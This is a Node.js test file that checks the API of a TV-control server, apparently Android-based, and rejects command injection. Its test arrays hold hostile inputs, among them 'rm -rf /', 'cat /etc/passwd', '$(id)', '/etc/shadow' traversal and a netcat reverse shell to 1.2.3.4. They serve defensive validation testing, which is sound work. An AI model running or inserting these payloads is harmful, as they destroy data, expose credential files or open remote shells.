/**
 * TvMaster - API & Security Input Validation Tests
 */

const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const { app, server } = require('../src/server');
const { APP_VERSION } = require('../src/constants');

const TEST_PORT = 3199;

describe('TvMaster API & Security Validation Tests', () => {
  before((done) => {
    server.listen(TEST_PORT, done);
  });

  after((done) => {
    server.close(done);
  });

  const baseUrl = `http://localhost:${TEST_PORT}`;

  test('GET /api/health returns 200 with TvMaster metadata', async () => {
    const res = await fetch(`${baseUrl}/api/health`);
    assert.strictEqual(res.status, 200);
    const data = await res.json();
    assert.strictEqual(data.app, 'TvMaster');
    assert.strictEqual(data.version, APP_VERSION);
    assert.strictEqual(data.status, 'ok');
  });

  test('GET /api/status returns initial device connection state', async () => {
    const res = await fetch(`${baseUrl}/api/status`);
    assert.strictEqual(res.status, 200);
    const data = await res.json();
    assert.strictEqual(typeof data.connected, 'boolean');
  });

  test('Security: POST /api/connect rejects command injection in IP address', async () => {
    const maliciousIps = [
      '192.168.1.1; cat /etc/passwd',
      '127.0.0.1 && whoami',
      '999.999.999.999',
      '192.168.1.1$(id)',
      'localhost',
      '../../../evil'
    ];

    for (const ip of maliciousIps) {
      const res = await fetch(`${baseUrl}/api/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip, port: 5555 })
      });
      assert.strictEqual(res.status, 400, `Expected 400 for malicious IP: ${ip}`);
    }
  });

  test('Security: POST /api/process/kill rejects command injection in package name', async () => {
    const maliciousPackages = [
      'com.google.android.youtube; rm -rf /',
      'com.netflix$(reboot)',
      '; whoami',
      'com.test | nc -e /bin/sh 1.2.3.4 4444',
      'invalid..package',
      '../../etc/shadow'
    ];

    for (const pkg of maliciousPackages) {
      const res = await fetch(`${baseUrl}/api/process/kill`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package: pkg })
      });
      assert.strictEqual(res.status, 400, `Expected 400 for malicious package: ${pkg}`);
    }
  });

  test('Security: POST /api/tuning/animation-scale rejects invalid boundaries', async () => {
    const invalidScales = ['999', '-1', 'abc', '0.5; reboot', 'NaN', 'Infinity'];

    for (const scale of invalidScales) {
      const res = await fetch(`${baseUrl}/api/tuning/animation-scale`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ scale })
      });
      assert.strictEqual(res.status, 400, `Expected 400 for invalid scale: ${scale}`);
    }
  });

  test('Security: POST /api/remote/key rejects command injection in keyevent', async () => {
    const maliciousKeys = [
      'KEYCODE_HOME; rm -rf /',
      'KEY && reboot',
      'KEY`id`',
      'KEYCODE HOME',
      'KEYCODE_HOME|cat'
    ];

    for (const key of maliciousKeys) {
      const res = await fetch(`${baseUrl}/api/remote/key`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key })
      });
      assert.strictEqual(res.status, 400, `Expected 400 for malicious key: ${key}`);
    }
  });

  test('Security: POST /api/package/uninstall rejects invalid package names', async () => {
    const malicious = ['com.app; rm -rf /', 'evil|reboot', '; whoami'];
    for (const pkg of malicious) {
      const res = await fetch(`${baseUrl}/api/package/uninstall`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package: pkg })
      });
      assert.strictEqual(res.status, 400);
    }
  });

  test('Security: POST /api/package/install rejects missing files', async () => {
    const res = await fetch(`${baseUrl}/api/package/install`, {
      method: 'POST'
    });
    assert.strictEqual(res.status, 400);
  });
});
